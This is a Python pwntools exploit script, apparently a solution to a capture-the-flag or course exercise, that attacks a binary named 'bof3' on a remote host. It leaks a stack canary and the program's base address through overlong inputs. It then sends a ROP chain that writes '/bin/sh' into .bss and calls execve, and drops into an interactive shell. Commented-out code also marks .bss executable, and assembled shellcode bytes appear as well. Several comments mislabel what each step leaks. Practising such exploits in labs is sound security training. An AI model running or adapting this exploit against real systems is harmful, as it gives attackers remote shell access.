#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
from loguru import logger

context.arch = 'amd64'
context.os = 'linux'


exe = './bof3'
port = 10261

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

bss_section = elf.bss()
rop = ROP(elf)

total_gadgets = rop.gadgets
# store all gadgets
gadgets_lst = []
for gadget in total_gadgets:
  gadgets_lst.append(gadget)
  # print the gadget instruction and address
  # addr = gadget
  # instructions = total_gadgets[gadget].insns
  # print(f"{len(gadgets_lst):<3} {hex(addr):<10}", end = '')
  # for insn in instructions:
  #   print(f"{insn}", end='; ')
  # print()

# print(f"{gadgets_lst[0]:x}", end=' ')
# print(f"{total_gadgets[gadgets_lst[0]].insns}")



# asm code
code = asm(shellcraft.sh())
# b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
shellcode = asm(shellcraft.amd64.linux.cat('/FLAG'))
task_offset = 0x8ad0
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
bin_sh = next(libc.search(b'/bin/sh'))
print(type(bin_sh))

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)
    



# Q1: What's your name? -> leak shellcode address
r.recvuntil(b"What's your name? ")
r.send(b'A'*41)
recv = r.recvline().strip()
print(f"{recv}")
ind = recv.rfind(b'A')
recv = recv[ind+1:]
canary = int.from_bytes(recv[:-6].rjust(8, b'\x00'), byteorder='little')
print(f"canary: 0x{canary:x}")
print(f"p64(canary): {p64(canary)}")



# Q2: What's the room number? -> leak canary
r.recvuntil(b"What's the room number? ")
r.send(b'A'*56)
recv = r.recvline().strip()
print(f"{recv}")
ind = recv.rfind(b'A')
recv = recv[ind+1:]
addr = int.from_bytes(recv[-6:].ljust(8, b'\x00'), byteorder='little')
base = addr - task_offset
print(f"base: 0x{base:x}")
print(f"{recv}")
bss_section += base
print(f"bss_section: {hex(bss_section)}")



# Q3: What's the customer's name? -> leak base address
r.recvuntil(b"What's the customer's name? ")
r.send(b'A')
recv = r.recvline().strip()


# create ROP chain
pop_rax_ret = base + rop.find_gadget(['pop rax', 'ret'])[0]  # ROP gadget: pop rax; ret;
pop_rdi_ret = base + rop.find_gadget(['pop rdi', 'ret'])[0]  # ROP gadget: pop rdi; ret;
pop_rsi_ret = base + rop.find_gadget(['pop rsi', 'ret'])[0]  # ROP gadget: pop rsi; ret;
pop_rdx_rbx_ret = base + rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # ROP gadget: pop rdx; pop rbx; ret;

syscall_ret = base + rop.find_gadget(['syscall', 'ret'])[0]  # syscall; ret;



# change .bss section protection to RWX
# rop.call(mprotect_addr, [bss_section, 0x1000, 7])
# mprotect(bss_address, bss_size, prot)
# rop.raw(pop_rax_ret)
# rop.raw(constants.SYS_mprotect)  # mprotect syscall
# rop.raw(pop_rdi_ret)
# rop.raw(bss_section & ~0xfff)  # align to page size
# rop.raw(pop_rsi_ret)
# rop.raw(10 * 0x1000)
# rop.raw(pop_rdx_rbx_ret)
# rop.raw(7)  # rdx: PROT_READ | PROT_WRITE | PROT_EXEC
# rop.raw(7)  # rbx
# rop.raw(syscall_ret)
# print(rop.dump())


tried = b'A'*40+p64(canary)+b'B'*8

# put b'/bin/sh\x00' in .bss section
tried += p64(pop_rax_ret)
tried += p64(0)  # read 系統調用號為 0
tried += p64(pop_rdi_ret)
tried += p64(0)  # stdin
tried += p64(pop_rsi_ret)
tried += p64(bss_section)  # 寫入 .bss 段
tried += p64(pop_rdx_rbx_ret)
tried += p64(8)  # 讀取 8 字節
tried += p64(0)  # rbx 為 0
tried += p64(syscall_ret)


# execve('/bin/sh', 0, 0)
tried += p64(pop_rax_ret)
tried += p64(0x3b)  # execve
tried += p64(pop_rdi_ret)
tried += p64(bss_section)
tried += p64(pop_rsi_ret)
tried += p64(0)
tried += p64(pop_rdx_rbx_ret)
tried += p64(0)
tried += p64(0)
tried += p64(syscall_ret)


# Q4: Leave your message: -> exploit
r.recvuntil(b"Leave your message: ") # b'B'*40+p64(canary)+b'B'*8+p64(shellcode_addr)
r.sendline(tried)
r.sendline(b'/bin/sh\x00')


recv = r.recvline().strip()
print(f"{recv}")

r.interactive()
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
# b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'